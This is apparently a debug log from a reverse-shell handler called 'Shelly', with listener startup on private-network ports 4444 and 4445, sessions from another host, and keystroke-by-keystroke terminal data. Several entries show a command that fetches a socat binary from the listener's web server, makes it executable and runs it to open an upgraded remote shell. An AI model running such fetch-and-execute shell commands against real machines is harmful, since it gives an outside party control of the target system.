+2026/03/23 22:40:44 ui.go:133: [UI] Session data (5 bytes): pwd
+2026/03/23 22:40:44 ui.go:492: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:40:44 ui.go:133: [UI] Session data (6 bytes): [K
+2026/03/23 22:40:44 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:44 ui.go:133: [UI] Session data (1 bytes): 
+2026/03/23 22:40:44 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:44 ui.go:133: [UI] Session data (1 bytes): n
+2026/03/23 22:40:44 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:44 ui.go:133: [UI] Session data (1 bytes): a
+2026/03/23 22:40:45 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:45 ui.go:133: [UI] Session data (1 bytes): n
+2026/03/23 22:40:45 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:45 ui.go:133: [UI] Session data (1 bytes): o
+2026/03/23 22:40:45 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:45 ui.go:133: [UI] Session data (1 bytes):  
+2026/03/23 22:40:45 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:45 ui.go:133: [UI] Session data (1 bytes): t
+2026/03/23 22:40:45 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:45 ui.go:133: [UI] Session data (1 bytes): e
+2026/03/23 22:40:45 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:45 ui.go:133: [UI] Session data (1 bytes): s
+2026/03/23 22:40:46 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:46 ui.go:133: [UI] Session data (1 bytes): t
+2026/03/23 22:40:46 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:46 ui.go:133: [UI] Session data (1 bytes): 
+2026/03/23 22:40:46 ui.go:492: [DEBUG] Session 1 read 8 bytes
+2026/03/23 22:40:46 ui.go:133: [UI] Session data (8 bytes): [?2004h
+2026/03/23 22:40:46 ui.go:492: [DEBUG] Session 1 read 68 bytes
+2026/03/23 22:40:46 ui.go:133: [UI] Session data (68 bytes): [?1049h[22;0;0t[1;24r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l
+2026/03/23 22:40:46 ui.go:492: [DEBUG] Session 1 read 172 bytes
+2026/03/23 22:40:46 ui.go:131: [UI] Session data (172 bytes): [39;49m(B[m[H[2J[22;28H(B[0;1m[37m[41m[ "test" is a directory ][39;49m(B[m[?12l[?25h...
+2026/03/23 22:40:46 ui.go:492: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:40:46 ui.go:133: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:40:48 main.go:168: Bubbletea program ended
+2026/03/23 22:51:34 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 22:51:36 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 22:51:36 main.go:162: Starting bubbletea program
+2026/03/23 22:51:47 ui.go:396: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 22:51:47 ui.go:158: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 22:51:47 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 22:51:47 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 22:51:47 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:51:49 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:52696
+2026/03/23 22:51:49 ui.go:150: [UI] New session 1 from 10.0.20.3:52696
+2026/03/23 22:51:50 ui.go:661: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:51:50 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:51:55 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:51:55 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 22:51:56 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:51:56 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 22:51:57 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:51:57 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 22:51:57 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:51:57 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 22:51:57 ui.go:661: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:51:57 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 22:52:09 ui.go:158: [UI] StartListenerMsg received: host=10.0.0.179 port=4445
+2026/03/23 22:52:09 main.go:124: [MAIN] Starting listener on 10.0.0.179:4445
+2026/03/23 22:52:09 listener.go:43: [LISTENER] Listening on 10.0.0.179:4445
+2026/03/23 22:52:09 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:52:09 ui.go:661: [DEBUG] Session 1 read 156 bytes
+2026/03/23 22:52:09 ui.go:137: [UI] Session data (156 bytes): wget -q http://10.0.0.179:8080/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bas...
+2026/03/23 22:52:09 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:52:09 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 22:52:09 ui.go:661: [DEBUG] Session 1 read 61 bytes
+2026/03/23 22:52:09 ui.go:139: [UI] Session data (61 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ [K
+2026/03/23 23:04:39 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:04:39 ui.go:139: [UI] Session data (1 bytes): l
+2026/03/23 23:04:39 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:04:39 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:04:39 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:04:39 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:04:39 ui.go:661: [DEBUG] Session 1 read 142 bytes
+2026/03/23 23:04:39 ui.go:137: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 23:04:39 ui.go:661: [DEBUG] Session 1 read 58 bytes
+2026/03/23 23:04:39 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:04:41 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:04:41 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:04:44 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:04:44 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:04:45 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:04:45 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:04:45 ui.go:661: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:04:45 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 23:05:18 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:18 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:19 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:19 ui.go:139: [UI] Session data (1 bytes): l
+2026/03/23 23:05:19 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:19 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:05:20 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:20 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:20 ui.go:661: [DEBUG] Session 1 read 142 bytes
+2026/03/23 23:05:20 ui.go:137: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 23:05:20 ui.go:661: [DEBUG] Session 1 read 58 bytes
+2026/03/23 23:05:20 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:05:25 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:25 ui.go:139: [UI] Session data (1 bytes): p
+2026/03/23 23:05:25 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:25 ui.go:139: [UI] Session data (1 bytes): w
+2026/03/23 23:05:25 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:25 ui.go:139: [UI] Session data (1 bytes): d
+2026/03/23 23:05:25 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:25 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:25 ui.go:661: [DEBUG] Session 1 read 69 bytes
+2026/03/23 23:05:25 ui.go:139: [UI] Session data (69 bytes): /home/mtfd
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:05:29 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:29 ui.go:139: [UI] Session data (1 bytes): c
+2026/03/23 23:05:29 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:29 ui.go:139: [UI] Session data (1 bytes): d
+2026/03/23 23:05:29 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:29 ui.go:139: [UI] Session data (1 bytes):  
+2026/03/23 23:05:31 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:31 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:31 ui.go:661: [DEBUG] Session 1 read 58 bytes
+2026/03/23 23:05:31 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:05:32 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:32 ui.go:139: [UI] Session data (1 bytes): l
+2026/03/23 23:05:32 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:32 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:05:33 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:33 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:33 ui.go:661: [DEBUG] Session 1 read 142 bytes
+2026/03/23 23:05:33 ui.go:137: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 23:05:33 ui.go:661: [DEBUG] Session 1 read 58 bytes
+2026/03/23 23:05:33 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:05:33 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:33 ui.go:139: [UI] Session data (1 bytes): c
+2026/03/23 23:05:33 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:33 ui.go:139: [UI] Session data (1 bytes): a
+2026/03/23 23:05:34 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:05:34 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:05:34 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:05:34 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:05:34 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:34 ui.go:139: [UI] Session data (1 bytes): e
+2026/03/23 23:05:34 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:34 ui.go:139: [UI] Session data (1 bytes): c
+2026/03/23 23:05:35 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:35 ui.go:139: [UI] Session data (1 bytes): h
+2026/03/23 23:05:35 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:35 ui.go:139: [UI] Session data (1 bytes): o
+2026/03/23 23:05:35 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:35 ui.go:139: [UI] Session data (1 bytes):  
+2026/03/23 23:05:35 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:35 ui.go:139: [UI] Session data (1 bytes): "
+2026/03/23 23:05:36 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:36 ui.go:139: [UI] Session data (1 bytes): t
+2026/03/23 23:05:36 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:36 ui.go:139: [UI] Session data (1 bytes): e
+2026/03/23 23:05:36 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:36 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:05:37 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:37 ui.go:139: [UI] Session data (1 bytes): t
+2026/03/23 23:05:37 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:37 ui.go:139: [UI] Session data (1 bytes): "
+2026/03/23 23:05:37 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:37 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:37 ui.go:661: [DEBUG] Session 1 read 63 bytes
+2026/03/23 23:05:37 ui.go:139: [UI] Session data (63 bytes): test
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:05:38 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:38 ui.go:139: [UI] Session data (1 bytes): e
+2026/03/23 23:05:39 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:39 ui.go:139: [UI] Session data (1 bytes): x
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (3 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (6 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:53 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:53 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:05:57 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:05:57 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:05:58 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:05:58 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:05:58 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:05:58 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:05:58 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:05:58 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:02 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:02 ui.go:139: [UI] Session data (1 bytes): p
+2026/03/23 23:06:02 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:02 ui.go:139: [UI] Session data (1 bytes): w
+2026/03/23 23:06:02 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:02 ui.go:139: [UI] Session data (1 bytes): d
+2026/03/23 23:06:03 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:03 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:06:03 ui.go:661: [DEBUG] Session 1 read 69 bytes
+2026/03/23 23:06:03 ui.go:139: [UI] Session data (69 bytes): /home/mtfd
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:06:23 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:23 ui.go:139: [UI] Session data (1 bytes): u
+2026/03/23 23:06:23 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:23 ui.go:139: [UI] Session data (1 bytes): p
+2026/03/23 23:06:24 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:24 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:24 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:24 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:25 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:25 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:06:26 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:26 ui.go:139: [UI] Session data (1 bytes):  
+2026/03/23 23:06:26 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:26 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:06:26 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:26 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:26 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:26 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:27 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:06:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:27 ui.go:139: [UI] Session data (1 bytes):  
+2026/03/23 23:06:28 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:28 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:28 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:28 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:28 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:06:28 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:06:29 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:29 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:06:29 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:29 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:06:29 ui.go:661: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:06:29 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 23:06:32 ui.go:158: [UI] StartListenerMsg received: host=10.0.0.179 port=4445
+2026/03/23 23:06:32 main.go:124: [MAIN] Starting listener on 10.0.0.179:4445
+2026/03/23 23:06:32 main.go:134: [MAIN] Listener error: listen tcp4 10.0.0.179:4445: bind: address already in use
+2026/03/23 23:06:32 ui.go:661: [DEBUG] Session 1 read 156 bytes
+2026/03/23 23:06:32 ui.go:137: [UI] Session data (156 bytes): wget -q http://10.0.0.179:8080/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bas...
+2026/03/23 23:06:32 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:06:32 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:06:32 ui.go:661: [DEBUG] Session 1 read 61 bytes
+2026/03/23 23:06:32 ui.go:139: [UI] Session data (61 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ [K
+2026/03/23 23:07:23 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:23 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:07:25 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:25 ui.go:139: [UI] Session data (1 bytes): :
+2026/03/23 23:07:26 ui.go:661: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:07:26 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:07:26 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:26 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:07:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:27 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:07:27 ui.go:661: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:07:27 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 23:07:30 main.go:168: Bubbletea program ended
+2026/03/23 23:07:31 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 23:07:33 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 23:07:33 main.go:162: Starting bubbletea program
+2026/03/23 23:07:36 ui.go:396: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 23:07:36 ui.go:158: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 23:07:36 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 23:07:36 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 23:07:36 main.go:137: [MAIN] Listener started successfully
+2026/03/23 23:07:46 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:34750
+2026/03/23 23:07:46 ui.go:150: [UI] New session 1 from 10.0.20.3:34750
+2026/03/23 23:07:46 ui.go:661: [DEBUG] Session 1 read 58 bytes
+2026/03/23 23:07:46 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:07:55 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:55 ui.go:139: [UI] Session data (1 bytes): l
+2026/03/23 23:07:55 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:55 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:07:55 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:55 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:07:55 ui.go:661: [DEBUG] Session 1 read 200 bytes
+2026/03/23 23:07:55 ui.go:137: [UI] Session data (200 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 23:07:56 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:56 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:07:57 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:07:57 ui.go:661: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:07:57 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:07:57 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 23:08:01 ui.go:158: [UI] StartListenerMsg received: host=10.0.0.179 port=4445
+2026/03/23 23:08:01 main.go:124: [MAIN] Starting listener on 10.0.0.179:4445
+2026/03/23 23:08:01 listener.go:43: [LISTENER] Listening on 10.0.0.179:4445
+2026/03/23 23:08:01 main.go:137: [MAIN] Listener started successfully
+2026/03/23 23:08:01 ui.go:661: [DEBUG] Session 1 read 156 bytes
+2026/03/23 23:08:01 ui.go:137: [UI] Session data (156 bytes): wget -q http://10.0.0.179:8080/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bas...
+2026/03/23 23:08:01 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:08:01 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:08:01 ui.go:661: [DEBUG] Session 1 read 61 bytes
+2026/03/23 23:08:01 ui.go:139: [UI] Session data (61 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ [K
+2026/03/23 23:08:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:08:27 ui.go:139: [UI] Session data (1 bytes): e
+2026/03/23 23:08:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:08:27 ui.go:139: [UI] Session data (1 bytes): x
+2026/03/23 23:08:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:08:27 ui.go:139: [UI] Session data (1 bytes): i
+2026/03/23 23:08:27 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:08:27 ui.go:139: [UI] Session data (1 bytes): t
+2026/03/23 23:08:28 ui.go:661: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:08:28 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:08:28 ui.go:661: [DEBUG] Session 1 read 5 bytes
+2026/03/23 23:08:28 ui.go:139: [UI] Session data (5 bytes): exit
+2026/03/23 23:08:28 ui.go:665: [DEBUG] Session 1 read error: EOF
+2026/03/23 23:08:28 ui.go:139: [UI] Session data (37 bytes): 
+[!] Session 1 connection closed: EOF
+2026/03/23 23:08:41 main.go:168: Bubbletea program ended
+2026/03/23 23:08:48 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 23:08:49 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 23:08:49 main.go:162: Starting bubbletea program
+2026/03/23 23:08:56 ui.go:405: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 23:08:56 ui.go:167: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 23:08:56 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 23:08:56 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 23:08:56 main.go:137: [MAIN] Listener started successfully
+2026/03/23 23:09:03 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:47944
+2026/03/23 23:09:03 ui.go:159: [UI] New session 1 from 10.0.20.3:47944
+2026/03/23 23:09:03 ui.go:704: [DEBUG] Session 1 read 58 bytes
+2026/03/23 23:09:03 ui.go:139: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 23:09:07 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:09:07 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:09:08 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:09:08 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:09:08 ui.go:704: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:09:08 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 23:09:27 ui.go:704: [DEBUG] Session 1 read 1 bytes
